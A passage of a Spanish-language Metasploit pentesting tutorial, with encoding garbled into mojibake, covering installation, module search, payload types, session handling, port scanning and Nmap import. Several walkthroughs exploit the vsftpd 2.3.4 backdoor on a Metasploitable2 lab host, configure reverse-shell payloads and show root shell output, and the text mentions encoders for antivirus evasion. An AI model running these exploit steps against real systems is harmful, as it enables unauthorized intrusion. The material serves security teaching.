| **Inicio**         | **atrÃ¡s 15**                                                  | **Siguiente 17**                         |
| ------------------ | ------------------------------------------------------------- | ---------------------------------------- |
| [ğŸ ](../README.md) | [âª](./7_15_Escaneo_Activo_y_Analisis_de_Vulnerabilidades.md) | [â©](./7_17_Hacking_Servicios_de_Red.md) |

---

## **Ãndice**

| Temario                                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------- |
| [939. IntroducciÃ³n a Metasploit Framework](#939-introducciÃ³n-a-metasploit-framework)                                   |
| [940. BÃºsqueda de mÃ³dulos](#940-bÃºsqueda-de-mÃ³dulos)                                                                   |
| [941. Tipos de payloads](#941-tipos-de-payloads)                                                                       |
| [942. ConfiguraciÃ³n y ejecuciÃ³n de mÃ³dulos](#942-configuraciÃ³n-y-ejecuciÃ³n-de-mÃ³dulos)                                 |
| [943. GestiÃ³n de uso de mÃ³dulos](#943-gestiÃ³n-de-uso-de-mÃ³dulos)                                                       |
| [944. Escaneo de puertos con mÃ³dulos auxiliares](#944-escaneo-de-puertos-con-mÃ³dulos-auxiliares)                       |
| [945. Importando informes de Nmap](#945-importando-informes-de-nmap)                                                   |
| [946. Escaneo de puertos con db_nmap](#946-escaneo-de-puertos-con-db_nmap)                                             |
| [947. Fingerprinting con mÃ³dulos auxiliares](#947-fingerprinting-con-mÃ³dulos-auxiliares)                               |
| [948. GestiÃ³n de espacios de trabajo](#948-gestiÃ³n-de-espacios-de-trabajo)                                             |
| [949. Importando informes de escÃ¡neres de vulnerabilidades](#949-importando-informes-de-escÃ¡neres-de-vulnerabilidades) |
| [950. Comando connect](#950-comando-connect)                                                                           |
| [951. Plugins de Metasploit](#951-plugins-de-metasploit)                                                               |
| [952. AnÃ¡lisis de vulnerabilidades con WMAP](#952-anÃ¡lisis-de-vulnerabilidades-con-wmap)                               |
| [953. AnÃ¡lisis de vulnerabilidades con Nessus](#953-anÃ¡lisis-de-vulnerabilidades-con-nessus)                           |
| [954. Connection Handler](#954-connection-handler)                                                                     |
| [955. InstalaciÃ³n de maquina de pruebas Metasploitable](#955-instalaciÃ³n-de-maquina-de-pruebas-metasploitable)         |
| [956. ExplotaciÃ³n de servicio FTP](#956-explotaciÃ³n-de-servicio-ftp)                                                   |
| [957. Extraer y descifrar contraseÃ±as](#957-extraer-y-descifrar-contraseÃ±as)                                           |
| [958. Netcat a Metasploit Shell](#958-netcat-a-metasploit-shell)                                                       |

# **Hacking: Pentesting con Metasploit**

## **939. IntroducciÃ³n a Metasploit Framework**

### âœ… Â¿QuÃ© es Metasploit Framework?

**Metasploit Framework** es una de las herramientas mÃ¡s potentes y populares del mundo del **hacking Ã©tico** y **pentesting**. Se utiliza principalmente para:

- Buscar y explotar vulnerabilidades
- Crear exploits personalizados
- Realizar pruebas de penetraciÃ³n automatizadas
- Mantener acceso a sistemas comprometidos (post-explotaciÃ³n)
- Generar payloads (cÃ³digo malicioso controlado)

> âš ï¸ **Metasploit** se usa en entornos controlados y con fines educativos, legales y Ã©ticos. No lo uses contra sistemas que no tienes permiso para auditar.

---

### ğŸ“š Â¿Para quÃ© sirve?

| FunciÃ³n                | ExplicaciÃ³n simple                                                               |
| ---------------------- | -------------------------------------------------------------------------------- |
| **ExplotaciÃ³n**        | Atacar sistemas con vulnerabilidades conocidas                                   |
| **Payloads**           | CÃ³digo que se ejecuta en el sistema vÃ­ctima (como reverse shell)                 |
| **Escaneo y anÃ¡lisis** | Buscar servicios y vulnerabilidades en la red                                    |
| **Post-explotaciÃ³n**   | Una vez adentro, realizar mÃ¡s acciones: leer archivos, escalar privilegios, etc. |

---

### ğŸ› ï¸ Â¿CÃ³mo instalar Metasploit Framework?

#### âœ… OpciÃ³n 1: Viene preinstalado en **Kali Linux**

Si usas Kali, simplemente abre la terminal y ejecuta:

```bash
msfconsole
```

---

#### âœ… OpciÃ³n 2: Instalar en Ubuntu/Debian manualmente

1. **Actualizar paquetes:**

```bash
sudo apt update && sudo apt upgrade -y
```

2. **Instalar dependencias:**

```bash
sudo apt install curl gnupg2 -y
```

3. **Descargar e instalar Metasploit:**

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

4. **Abrir Metasploit:**

```bash
msfconsole
```

---

#### âœ… OpciÃ³n 3: En Windows (con WSL)

Instalarlo directamente en Windows es mÃ¡s complejo. Lo mÃ¡s recomendable es usar:

- **WSL con Kali Linux**
- **MÃ¡quina virtual con Kali**
- **Instalar desde Metasploit Installer de Rapid7** (menos usado hoy)

---

### ğŸ” Comandos bÃ¡sicos de Metasploit

| Comando           | QuÃ© hace                                  |
| ----------------- | ----------------------------------------- |
| `msfconsole`      | Inicia la consola de Metasploit           |
| `search`          | Buscar exploits, payloads, mÃ³dulos        |
| `use`             | Cargar un mÃ³dulo para usarlo              |
| `info`            | InformaciÃ³n detallada sobre un mÃ³dulo     |
| `set`             | Establece parÃ¡metros como RHOST o PAYLOAD |
| `run` o `exploit` | Ejecuta el ataque                         |
| `sessions`        | Ver sesiones activas con vÃ­ctimas         |

---

### ğŸ’£ Ejemplo completo: Ataque con Metasploit a una mÃ¡quina vulnerable

#### ğŸ¯ Objetivo: Conectarnos a una mÃ¡quina vulnerable **Metasploitable2** usando un exploit

#### ğŸ§ª Paso 1: Escaneo con Nmap

Desde Kali:

```bash
nmap -sV 192.168.1.105
```

Ejemplo de resultado:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
```

> ğŸ¯ El puerto 21 estÃ¡ abierto y tiene una versiÃ³n de `vsftpd` vulnerable.

---

#### ğŸ§ª Paso 2: Iniciar Metasploit

```bash
msfconsole
```

---

#### ğŸ§ª Paso 3: Buscar el exploit

```bash
search vsftpd 2.3.4
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### ğŸ§ª Paso 4: Usar el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### ğŸ§ª Paso 5: Configurar el objetivo

```bash
set RHOST 192.168.1.105
```

> Si necesitas configurar el puerto:

```bash
set RPORT 21
```

---

#### ğŸ§ª Paso 6: Ejecutar el exploit

```bash
exploit
```

Resultado:

```
[*] Command shell session 1 opened
```

Â¡Ã‰xito! Tienes una **shell del sistema vÃ­ctima** ğŸ‰

---

#### ğŸ§ª Paso 7: Interactuar con la sesiÃ³n

```bash
sessions
sessions -i 1
```

Ahora puedes ejecutar comandos como:

```bash
whoami
uname -a
ls
```

---

### ğŸ§© ConclusiÃ³n

| Elemento                   | Valor                                                      |
| -------------------------- | ---------------------------------------------------------- |
| ğŸ› ï¸ Herramienta             | Metasploit Framework                                       |
| ğŸ“Œ FunciÃ³n principal       | Explotar vulnerabilidades en sistemas y web apps           |
| ğŸ§ª Ideal para              | Pentesting, CTFs, laboratorios de seguridad, bug bounty    |
| âœ… InstalaciÃ³n recomendada | Kali Linux (ya viene incluido)                             |
| ğŸ” Uso Ã©tico               | Solo en laboratorios o entornos donde tengas permiso legal |

---

[ğŸ”¼](#Ã­ndice)

---

## **940. BÃºsqueda de mÃ³dulos**

### ğŸ” Â¿QuÃ© es la **bÃºsqueda de mÃ³dulos** en Metasploit?

En Metasploit, los **mÃ³dulos** son piezas de cÃ³digo listas para usarse que te ayudan a:

| Tipo de mÃ³dulo | Â¿QuÃ© hace?                                                                      |
| -------------- | ------------------------------------------------------------------------------- |
| `exploit`      | Atacar una vulnerabilidad especÃ­fica.                                           |
| `auxiliary`    | Escanear, recolectar info, analizar servicios, etc.                             |
| `payload`      | CÃ³digo que se ejecuta en la vÃ­ctima despuÃ©s del exploit (como abrir una shell). |
| `post`         | Tareas despuÃ©s de explotar (como robar contraseÃ±as o escalar privilegios).      |
| `encoder`      | Codificar un payload para evadir detecciÃ³n.                                     |
| `nop`          | Relleno (no hace nada, pero sirve en exploits buffer overflow).                 |

---

### ğŸ› ï¸ Â¿CÃ³mo buscar mÃ³dulos en Metasploit?

Una vez estÃ¡s en la consola de Metasploit (`msfconsole`), usas el comando:

```bash
search <palabra_clave>
```

---

### âœ… Ejemplos bÃ¡sicos de bÃºsqueda:

#### 1. Buscar por nombre del servicio:

```bash
search vsftpd
```

Resultado esperado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### 2. Buscar por tipo de vulnerabilidad:

```bash
search type:exploit name:samba
```

Resultado:

```
exploit/linux/samba/trans2open
```

---

#### 3. Buscar mÃ³dulos auxiliares:

```bash
search type:auxiliary name:scanner
```

Esto listarÃ¡ **scanners** para SMB, FTP, HTTP, SNMP, etc.

---

#### 4. Buscar por CVE:

```bash
search cve:2017-0144
```

Resultado:

```
exploit/windows/smb/ms17_010_eternalblue
```

---

#### 5. Filtro por plataforma (por ejemplo, Windows):

```bash
search platform:windows type:exploit
```

---

### ğŸ§  Â¿CÃ³mo sÃ© quÃ© mÃ³dulo usar?

DespuÃ©s de buscar uno, puedes usar el comando:

```bash
info <nombre_del_mÃ³dulo>
```

Ejemplo:

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

Te dirÃ¡:

- QuÃ© hace
- QuÃ© necesita (RHOST, RPORT, payloads, etc.)
- QuÃ© sistemas vulnerables ataca

---

### âœ… InstalaciÃ³n de Metasploit (por si no lo tienes)

Ya viene instalado en **Kali Linux**, pero si lo necesitas instalar en otra distro:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### ğŸ§ª Ejemplo completo: BÃºsqueda de exploit para vsftpd 2.3.4

#### Paso 1: Inicia Metasploit

```bash
msfconsole
```

---

#### Paso 2: Busca el mÃ³dulo

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 3: Verifica detalles del mÃ³dulo

```bash
info exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Usar el mÃ³dulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 5: Establece parÃ¡metros necesarios

```bash
set RHOST 192.168.1.105
```

> AsegÃºrate de que el objetivo es vulnerable (por ejemplo, usando Metasploitable2).

---

#### Paso 6: Ejecuta el exploit

```bash
exploit
```

Â¡Y listo! Si todo saliÃ³ bien, tendrÃ¡s acceso a la vÃ­ctima.

---

### âœ… Resumen prÃ¡ctico

| AcciÃ³n                  | Comando Ejemplo                             |
| ----------------------- | ------------------------------------------- |
| Buscar cualquier mÃ³dulo | `search smb`                                |
| Buscar por tipo         | `search type:exploit`                       |
| Buscar por CVE          | `search cve:2017-0144`                      |
| Buscar por plataforma   | `search platform:linux`                     |
| Ver info de mÃ³dulo      | `info exploit/unix/ftp/vsftpd_234_backdoor` |
| Usar mÃ³dulo             | `use exploit/unix/ftp/vsftpd_234_backdoor`  |

---

[ğŸ”¼](#Ã­ndice)

---

## **941. Tipos de payloads**

### ğŸ§  Â¿QuÃ© es un payload?

En el contexto del **hacking Ã©tico**, un **payload** es el **cÃ³digo que se ejecuta en la mÃ¡quina vÃ­ctima** despuÃ©s de haber explotado una vulnerabilidad. Es el "cargamento" malicioso que el atacante envÃ­a.

#### ğŸ§© Ejemplo real:

Si usas un exploit para aprovechar una vulnerabilidad en un servidor FTP, el **exploit** abre la puerta y el **payload** es lo que metes por esa puerta, por ejemplo: una terminal remota (shell).

---

### ğŸ§· Tipos principales de payloads en Metasploit

Metasploit agrupa los payloads en 3 grandes tipos:

| Tipo        | Â¿QuÃ© hace?                                                                  |
| ----------- | --------------------------------------------------------------------------- |
| **Singles** | Un solo archivo. Ejecuta una acciÃ³n especÃ­fica.                             |
| **Stagers** | Carga una parte del payload primero y luego descarga el resto.              |
| **Stages**  | Segunda parte de un stager. Contiene el cÃ³digo completo (como meterpreter). |

> ğŸ’¡ En general, Metasploit combina **stager + stage** en un **payload completo**.

---

### ğŸ”¥ ClasificaciÃ³n de payloads segÃºn lo que hacen

#### 1. **Bind Shell**

- La vÃ­ctima abre un puerto y el atacante se conecta.
- No pasa por firewalls si estÃ¡n cerrados.
- Necesita que el puerto en la vÃ­ctima estÃ© abierto.

**Ejemplo:**

```
payload/linux/x86/shell_bind_tcp
```

---

#### 2. **Reverse Shell**

- La vÃ­ctima se conecta al atacante.
- Ideal para saltarse firewalls.
- El atacante debe estar escuchando (con `LHOST` y `LPORT`).

**Ejemplo:**

```
payload/windows/meterpreter/reverse_tcp
```

---

#### 3. **Meterpreter**

- Shell avanzada. Control total.
- Funciona sobre reverse o bind shell.
- Permite:

  - Captura de pantalla
  - Escalar privilegios
  - Leer archivos
  - Keylogger
  - Crear persistencia

**Ejemplo:**

```
windows/meterpreter/reverse_tcp
```

---

#### 4. **Command Payloads**

- Ejecutan comandos simples en la vÃ­ctima.
- Son muy pequeÃ±os, pero limitados.

**Ejemplo:**

```
cmd/unix/reverse
```

---

### âš™ï¸ Â¿CÃ³mo buscar payloads?

Desde Metasploit:

```bash
show payloads
```

O para ver payloads compatibles con un exploit:

```bash
show payloads
```

(luego de hacer `use exploit/...`)

---

### ğŸ”½ Â¿CÃ³mo instalar Metasploit?

Ya lo vimos antes, pero lo resumo:

#### En Kali Linux:

```bash
msfconsole
```

#### En Debian/Ubuntu:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### ğŸ§ª EJEMPLO COMPLETO PASO A PASO

#### ğŸ¯ Objetivo:

Hacer que la mÃ¡quina vÃ­ctima (Metasploitable2) se conecte a nuestra Kali usando un **payload reverse shell Meterpreter**.

---

#### Paso 1: Escanear con Nmap

```bash
nmap -sV 192.168.1.105
```

Resultado:

```
21/tcp open  vsftpd 2.3.4
```

---

#### Paso 2: Iniciar Metasploit

```bash
msfconsole
```

---

#### Paso 3: Buscar el exploit

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Usar el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 5: Ver los payloads compatibles

```bash
show payloads
```

VerÃ¡s cosas como:

```
cmd/unix/interact
```

---

#### Paso 6: Seleccionar un payload

```bash
set payload cmd/unix/interact
```

O si fuera Windows con Meterpreter:

```bash
set payload windows/meterpreter/reverse_tcp
```

---

#### Paso 7: Configurar direcciÃ³n de escucha

```bash
set RHOST 192.168.1.105
set LHOST 192.168.1.100  # tu IP
```

---

#### Paso 8: Ejecutar el exploit

```bash
exploit
```

---

#### Paso 9: Â¡Acceso!

Si todo fue bien, tendrÃ¡s acceso a una shell interactiva. Si usaste Meterpreter:

```bash
sessions
sessions -i 1
```

Y ya puedes usar comandos como:

```bash
sysinfo
getuid
ls
```

---

### ğŸ“Œ RESUMEN FINAL

| Concepto             | Ejemplo                                               |
| -------------------- | ----------------------------------------------------- |
| Payload              | CÃ³digo que se ejecuta despuÃ©s de explotar un objetivo |
| Tipos                | Reverse shell, Bind shell, Meterpreter, CMD           |
| Combinaciones        | Stager + Stage = Payload completo                     |
| Buscar en Metasploit | `show payloads`                                       |
| Usar un payload      | `set payload <nombre>`                                |

---

[ğŸ”¼](#Ã­ndice)

---

## **942. ConfiguraciÃ³n y ejecuciÃ³n de mÃ³dulos**

### ğŸ” Â¿QuÃ© es un mÃ³dulo en Metasploit?

Un **mÃ³dulo** en Metasploit es **una unidad de funcionalidad reutilizable**. Es como una pieza de cÃ³digo preparada para realizar una tarea especÃ­fica en el ciclo de pentesting.

> En resumen: Â¡son herramientas dentro de Metasploit!

---

### ğŸ§© Tipos de mÃ³dulos

| Tipo de mÃ³dulo | Â¿QuÃ© hace?                                                    |
| -------------- | ------------------------------------------------------------- |
| `exploit`      | Aprovecha una vulnerabilidad para acceder a un sistema        |
| `payload`      | CÃ³digo que se ejecuta una vez que se ha explotado algo        |
| `auxiliary`    | MÃ³dulos de apoyo (escaneo, fuerza bruta, sniffers, etc.)      |
| `post`         | Acciones luego de obtener acceso (pivoting, keyloggers, etc.) |
| `encoder`      | Ofusca el payload para evadir antivirus                       |
| `nop`          | Instrucciones de relleno para evitar detecciÃ³n                |

---

### ğŸ”§ Â¿CÃ³mo se instala Metasploit?

#### En Kali Linux:

Ya viene instalado. Solo abre:

```bash
msfconsole
```

#### En Ubuntu/Debian:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### âš™ï¸ Â¿CÃ³mo configurar y ejecutar un mÃ³dulo?

Te explico con pasos claros ğŸ‘‡

---

#### Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### Paso 2: Buscar un mÃ³dulo

Por ejemplo, si queremos buscar un exploit para FTP:

```bash
search ftp
```

TambiÃ©n puedes filtrar:

```bash
search type:exploit name:vsftpd
```

---

#### Paso 3: Usar un mÃ³dulo

Cuando encuentres el que necesitas, lo seleccionas con:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Ver opciones requeridas

```bash
show options
```

VerÃ¡s cosas como:

```
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
RHOST                       yes       IP de la vÃ­ctima
RPORT     21                yes       Puerto FTP
```

---

#### Paso 5: Configurar variables necesarias

```bash
set RHOST 192.168.1.105
set RPORT 21
set LHOST 192.168.1.100
```

Si vas a usar un payload:

```bash
set payload cmd/unix/interact
```

---

#### Paso 6: Ejecutar el mÃ³dulo

```bash
run
```

o:

```bash
exploit
```

---

### âœ… EJEMPLO COMPLETO REAL

#### ğŸ¯ Objetivo: Explotar vsftpd 2.3.4 en una mÃ¡quina vulnerable (como Metasploitable2)

---

#### Paso 1: Abrimos Metasploit

```bash
msfconsole
```

---

#### Paso 2: Buscar mÃ³dulo de exploit para vsftpd

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 3: Usamos el mÃ³dulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Ver opciones

```bash
show options
```

---

#### Paso 5: Configuramos IP de la vÃ­ctima

```bash
set RHOST 192.168.1.105
```

Este exploit ya trae un payload por defecto (cmd/unix/interact), asÃ­ que no necesitas configurar payload.

---

#### Paso 6: Ejecutamos el mÃ³dulo

```bash
run
```

---

#### Resultado:

Si todo va bien, te aparecerÃ¡ una shell interactiva:

```
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

Â¡Acceso conseguido! ğŸš©

---

### ğŸ§  RESUMEN FINAL

| Paso | AcciÃ³n                                  |
| ---- | --------------------------------------- |
| 1    | `search <palabra clave>`                |
| 2    | `use <nombre del mÃ³dulo>`               |
| 3    | `show options`                          |
| 4    | `set RHOST`, `set LHOST`, `set payload` |
| 5    | `run` o `exploit`                       |
| 6    | Interactuar con la sesiÃ³n (`sessions`)  |

---

[ğŸ”¼](#Ã­ndice)

---

## **943. GestiÃ³n de uso de mÃ³dulos**

### ğŸ§© Â¿QuÃ© es la gestiÃ³n de mÃ³dulos en Metasploit?

La **gestiÃ³n de mÃ³dulos** consiste en:

- ğŸ“Œ Buscar mÃ³dulos segÃºn tus necesidades (exploits, escaneos, post-explotaciÃ³nâ€¦).
- âš™ï¸ Configurar correctamente sus parÃ¡metros.
- ğŸ¯ Ejecutarlos y controlar el resultado.
- ğŸ”„ Gestionar sesiones activas si se logra una intrusiÃ³n.

---

### ğŸ“š Tipos de mÃ³dulos en Metasploit

| Tipo        | FunciÃ³n                                                                  |
| ----------- | ------------------------------------------------------------------------ |
| `exploit`   | Ejecuta vulnerabilidades para acceder a un sistema                       |
| `auxiliary` | Herramientas de apoyo (escaneo, sniffers, fuerza bruta, etc.)            |
| `post`      | Acciones despuÃ©s del acceso (dump de contraseÃ±as, persistencia, etc.)    |
| `payload`   | CÃ³digo que se ejecuta tras el exploit (reverse shell, meterpreter, etc.) |
| `encoder`   | Ofuscar payloads para evitar detecciÃ³n                                   |
| `nop`       | Instrucciones vacÃ­as para relleno                                        |

---

### ğŸ› ï¸ Â¿CÃ³mo instalar Metasploit?

#### En Kali Linux:

Ya viene instalado.

```bash
msfconsole
```

#### En Ubuntu (manual):

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### ğŸ” GestiÃ³n de mÃ³dulos paso a paso

#### âœ… Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### âœ… Paso 2: Buscar un mÃ³dulo

Ejemplo: quieres atacar un servidor FTP

```bash
search type:exploit name:ftp
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### âœ… Paso 3: Usar el mÃ³dulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

VerÃ¡s que el prompt cambia a:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

---

#### âœ… Paso 4: Ver opciones del mÃ³dulo

```bash
show options
```

Esto muestra las variables necesarias como:

- RHOST â†’ IP de la vÃ­ctima
- RPORT â†’ Puerto objetivo
- PAYLOAD â†’ (si aplica)

---

#### âœ… Paso 5: Configurar las opciones necesarias

```bash
set RHOST 192.168.1.105
set RPORT 21
```

Si deseas cambiar el payload:

```bash
set payload cmd/unix/reverse
set LHOST 192.168.1.106
set LPORT 4444
```

---

#### âœ… Paso 6: Ejecutar el mÃ³dulo

```bash
exploit
```

o

```bash
run
```

---

### ğŸ§  GestiÃ³n adicional: sesiones

Si obtuviste acceso, puedes tener una sesiÃ³n activa.

#### Ver sesiones:

```bash
sessions
```

#### Interactuar con una sesiÃ³n especÃ­fica:

```bash
sessions -i 1
```

#### Salir de la sesiÃ³n sin cerrarla:

```bash
background
```

---

### âœ… EJEMPLO COMPLETO

#### Escenario: Atacar un servidor FTP vulnerable (Metasploitable2)

---

#### ğŸ”¹ Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### ğŸ”¹ Paso 2: Buscar exploit

```bash
search vsftpd
```

---

#### ğŸ”¹ Paso 3: Usar exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### ğŸ”¹ Paso 4: Ver opciones

```bash
show options
```

---

#### ğŸ”¹ Paso 5: Configurar IP de vÃ­ctima

```bash
set RHOST 192.168.1.105
```

No se requiere payload, ya que este exploit abre una shell.

---

#### ğŸ”¹ Paso 6: Ejecutar

```bash
run
```

---

#### Resultado:

```
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

Ahora puedes hacer:

```bash
sessions
sessions -i 1
```

Y ya tienes acceso root ğŸ˜

---

### ğŸ§  CONSEJOS ÃšTILES

| Comando            | FunciÃ³n                            |
| ------------------ | ---------------------------------- |
| `search`           | Buscar mÃ³dulos                     |
| `use`              | Usar un mÃ³dulo                     |
| `set`              | Asignar valor a opciones           |
| `unset`            | Eliminar una opciÃ³n                |
| `show options`     | Mostrar variables del mÃ³dulo       |
| `info`             | InformaciÃ³n detallada del mÃ³dulo   |
| `exploit` / `run`  | Ejecutar el mÃ³dulo                 |
| `sessions`         | Ver sesiones activas               |
| `sessions -i <id>` | Entrar a sesiÃ³n activa             |
| `background`       | Regresar al menÃº sin cerrar sesiÃ³n |

---

[ğŸ”¼](#Ã­ndice)

---

## **944. Escaneo de puertos con mÃ³dulos auxiliares**

### ğŸ§  Â¿QuÃ© es el escaneo de puertos con mÃ³dulos auxiliares?

El escaneo de puertos consiste en identificar **puertos abiertos** en un sistema remoto. Esto es importante porque:

- Cada puerto abierto puede indicar un **servicio** corriendo (como SSH, FTP, HTTP, etc.).
- Identificar los servicios permite planear **exploits** o ataques dirigidos.

Metasploit tiene **mÃ³dulos auxiliares** (`auxiliary/scanner`) que permiten realizar **escaneos de puertos y servicios** sin explotar directamente una vulnerabilidad.

---

### ğŸ› ï¸ InstalaciÃ³n de Metasploit

Si estÃ¡s en **Kali Linux**, ya viene instalado:

```bash
msfconsole
```

Si usas **Ubuntu**, puedes instalarlo asÃ­:

```bash
sudo apt update
sudo apt install curl -y
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### ğŸ” MÃ³dulos auxiliares de escaneo

Algunos mÃ³dulos Ãºtiles para escaneo de puertos:

| MÃ³dulo auxiliar         | FunciÃ³n                             |
| ----------------------- | ----------------------------------- |
| `scanner/portscan/tcp`  | Escaneo TCP simple                  |
| `scanner/portscan/syn`  | Escaneo SYN (rÃ¡pido y mÃ¡s sigiloso) |
| `scanner/portscan/ack`  | Determinar reglas de firewall       |
| `scanner/portscan/xmas` | Escaneo tipo Xmas para firewalls    |

---

### âš™ï¸ Comandos bÃ¡sicos

| Comando                | FunciÃ³n                        |
| ---------------------- | ------------------------------ |
| `search portscan`      | Buscar mÃ³dulos de escaneo      |
| `use <mÃ³dulo>`         | Seleccionar un mÃ³dulo          |
| `show options`         | Ver las opciones configurables |
| `set <opciÃ³n> <valor>` | Configurar variables           |
| `run` o `exploit`      | Ejecutar el mÃ³dulo             |

---

### âœ… EJEMPLO COMPLETO: Escaneo de puertos TCP

#### ğŸ§ª Objetivo:

Escanear los puertos abiertos de una mÃ¡quina con IP `192.168.1.105` usando el mÃ³dulo auxiliar de TCP.

---

#### ğŸ”¹ Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### ğŸ”¹ Paso 2: Buscar el mÃ³dulo

```bash
search portscan
```

Busca esto:

```
auxiliary/scanner/portscan/tcp
```

---

#### ğŸ”¹ Paso 3: Usar el mÃ³dulo

```bash
use auxiliary/scanner/portscan/tcp
```

---

#### ğŸ”¹ Paso 4: Ver las opciones

```bash
show options
```

VerÃ¡s algo como:

```
RHOSTS        => (IP o rango objetivo)
PORTS         => (puertos a escanear)
THREADS       => (cantidad de hilos para escaneo concurrente)
```

---

#### ğŸ”¹ Paso 5: Configurar los parÃ¡metros

```bash
set RHOSTS 192.168.1.105
set PORTS 21-1000
set THREADS 20
```

Esto escanearÃ¡ los puertos del 21 al 1000 en la IP objetivo con 20 hilos simultÃ¡neos.

---

#### ğŸ”¹ Paso 6: Ejecutar el escaneo

```bash
run
```

Resultado tÃ­pico:

```
[*] 192.168.1.105:21 - TCP OPEN
[*] 192.168.1.105:22 - TCP OPEN
[*] 192.168.1.105:80 - TCP OPEN
[*] 192.168.1.105:111 - TCP OPEN
```

Â¡Listo! Ahora sabes quÃ© servicios estÃ¡n expuestos y puedes usar exploits especÃ­ficos.

---

### âœ… ComparaciÃ³n con Nmap

Nmap tambiÃ©n hace escaneos, pero Metasploit te permite **integrar directamente con exploits**, ademÃ¡s de automatizar tareas posteriores.

Por ejemplo:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.105
run
```

---

### ğŸ§  Consejos Ãºtiles

- Puedes escanear rangos completos: `set RHOSTS 192.168.1.0/24`
- Puedes usar varios mÃ³dulos: tambiÃ©n hay auxiliares para **servicios especÃ­ficos** (como `scanner/ssh/ssh_version`)
- Para evitar ser detectado por IDS/IPS, usa `scanner/portscan/syn` (tipo stealth)

---

[ğŸ”¼](#Ã­ndice)

---

## **945. Importando informes de Nmap**

### ğŸ§  Â¿QuÃ© significa importar informes de Nmap?

Cuando haces un escaneo con **Nmap**, puedes guardar los resultados en un **archivo XML**.

Luego, puedes **importar ese archivo en Metasploit** para:

- Aprovechar la informaciÃ³n de hosts, puertos y servicios escaneados.
- Usar esa informaciÃ³n para lanzar exploits de forma mÃ¡s rÃ¡pida.
- Organizar mejor tus sesiones de ataque o anÃ¡lisis de red.

---

### ğŸ› ï¸ Paso 1: Hacer un escaneo con Nmap y guardar como XML

Abre tu terminal (en Kali Linux o cualquier distro que tenga Nmap) y ejecuta:

```bash
nmap -sS -p 21,22,80,443 -oX escaneo.xml 192.168.1.105
```

#### Â¿QuÃ© hace esto?

- `-sS`: Escaneo TCP SYN (modo sigiloso).
- `-p`: Puertos que quieres escanear.
- `-oX escaneo.xml`: Exporta los resultados en formato XML (necesario para importar en Metasploit).
- `192.168.1.105`: IP objetivo.

Esto crearÃ¡ un archivo llamado `escaneo.xml` con toda la informaciÃ³n del escaneo.

---

### ğŸ› ï¸ Paso 2: Abrir Metasploit

En la terminal escribe:

```bash
msfconsole
```

---

### ğŸ› ï¸ Paso 3: Verificar que estÃ¡s en una base de datos de Metasploit

Primero, asegÃºrate de que la **base de datos estÃ¡ conectada**. Usa:

```bash
db_status
```

Si ves:

```
[*] Connected to msf...
```

Todo estÃ¡ bien.

Si no estÃ¡ conectada, puedes iniciar PostgreSQL (en Kali) asÃ­:

```bash
sudo systemctl start postgresql
```

---

### ğŸ› ï¸ Paso 4: Importar el archivo XML

Ahora importa el archivo `.xml` que generaste con Nmap:

```bash
db_import /ruta/al/archivo/escaneo.xml
```

Ejemplo:

```bash
db_import /home/kali/escaneo.xml
```

---

### âœ… Â¿QuÃ© pasa al importar?

Metasploit:

- AÃ±ade los **hosts detectados** a su base de datos interna.
- Reconoce los **puertos abiertos** y servicios.
- Puedes consultarlos con comandos como:

```bash
hosts
services
```

Resultado tÃ­pico:

```
Hosts
======
address         mac    name    os_name
192.168.1.105          target  Linux

Services
========
host            port  proto  name  state
192.168.1.105   22    tcp    ssh   open
192.168.1.105   80    tcp    http  open
```

---

### ğŸ§ª EJEMPLO COMPLETO

#### ğŸ”¹ Paso 1: Escaneo con Nmap

```bash
nmap -sS -p 21-1000 -oX resultado.xml 192.168.1.105
```

#### ğŸ”¹ Paso 2: Abrir Metasploit

```bash
msfconsole
```

#### ğŸ”¹ Paso 3: Confirmar base de datos

```bash
db_status
```

#### ğŸ”¹ Paso 4: Importar resultado

```bash
db_import /home/kali/resultado.xml
```

